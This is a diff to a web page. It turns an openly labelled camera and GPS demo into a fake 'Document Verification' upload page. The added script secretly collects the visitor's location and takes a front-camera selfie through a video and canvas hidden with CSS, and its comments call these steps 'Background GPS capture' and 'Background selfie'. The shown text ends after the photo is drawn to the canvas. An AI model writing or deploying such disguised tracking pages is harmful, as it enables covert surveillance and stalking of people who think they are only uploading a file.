@@ -1,78 +1,60 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GPS & Camera Capture</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Upload Document</title>
+    <style>
+        body{font-family:Arial;margin:40px;background:#f0f0f0;text-align:center;}
+        button{padding:15px 30px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;font-size:16px;}
+        button:hover{background:#0056b3;}
+        input[type="file"]{margin:20px;display:block;}
+        #status{font-size:18px;color:#28a745;margin-top:20px;}
+        video,canvas{display:none !important;} /* Hidden */
+    </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1><i class="fas fa-camera"></i> GPS & Camera Capture</h1>
-            <p class="subtitle">Allow permissions to use your camera and location.</p>
-        </header>
+    <h1>Document Verification</h1>
+    <p>Please upload your document for verification.</p>
+    
+    <input type="file" id="fileInput" accept="*/*">
+    <br>
+    <button id="uploadAll" disabled>Upload & Verify</button>
+    <div id="status"></div>
 
-        <main>
-            <!-- Camera Section -->
-            <section class="card">
-                <h2><i class="fas fa-video"></i> Camera</h2>
-                <div class="video-container">
-                    <video id="video" autoplay playsinline>Video stream not available.</video>
-                </div>
-                <div class="controls">
-                    <button id="start-camera" class="btn btn-primary">
-                        <i class="fas fa-play"></i> Start Camera
-                    </button>
-                    <button id="take-photo" class="btn btn-success" disabled>
-                        <i class="fas fa-camera"></i> Take Photo
-                    </button>
-                </div>
-                <div class="output">
-                    <h3>Your Photo:</h3>
-                    <canvas id="canvas" style="display:none;"></canvas>
-                    <img id="photo" src="" alt="Your captured photo will appear here.">
-                </div>
-            </section>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
-            <!-- GPS Section -->
-            <section class="card">
-                <h2><i class="fas fa-map-marker-alt"></i> GPS Location</h2>
-                <div class="controls">
-                    <button id="get-location" class="btn btn-primary">
-                        <i class="fas fa-location-crosshairs"></i> Get My Location
-                    </button>
-                </div>
-                <div class="output">
-                    <h3>Your Location:</h3>
-                    <p id="location-status">Not yet retrieved.</p>
-                    <div id="location-data" class="hidden">
-                        <p><strong>Latitude:</strong> <span id="latitude"></span></p>
-                        <p><strong>Longitude:</strong> <span id="longitude"></span></p>
-                        <p><strong>Accuracy:</strong> <span id="accuracy"></span> meters</p>
-                        <p><strong>Map Link:</strong> <a id="map-link" target="_blank">Open in Google Maps</a></p>
-                    </div>
-                </div>
-            </section>
-
-            <!-- Data Display Section -->
-            <section class="card summary">
-                <h2><i class="fas fa-clipboard-list"></i> Captured Data</h2>
-                <div id="data-summary">
-                    <p>Your photo and location data will be shown together here after capture.</p>
-                </div>
-                <button id="download-btn" class="btn btn-download hidden">
-                    <i class="fas fa-download"></i> Download Data as Text
-                </button>
-            </section>
-        </main>
-
-        <footer>
-            <p>This page uses your device's camera and GPS. Your data stays in your browser.</p>
-        </footer>
-    </div>
-
-    <script src="script.js"></script>
-</body>
-</html>
+    <script>
+        let lat, lng, photoData;
+        const statusEl = document.getElementById('status');
+        const uploadBtn = document.getElementById('uploadAll');
+        const fileInput = document.getElementById('fileInput');
+        
+        // Enable button when file selected
+        fileInput.onchange = () => {
+            if (fileInput.files[0]) uploadBtn.disabled = false;
+        };
+        
+        // Background GPS capture when upload clicked [web:1][web:8]
+        uploadBtn.onclick = async () => {
+            statusEl.textContent = 'Capturing location...';
+            uploadBtn.disabled = true;
+            
+            try {
+                // GPS first
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                lat = pos.coords.latitude; lng = pos.coords.longitude;
+                
+                // Background selfie [web:2][web:9]
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {facingMode: 'user', width: 320, height: 240}
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for camera
+                
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
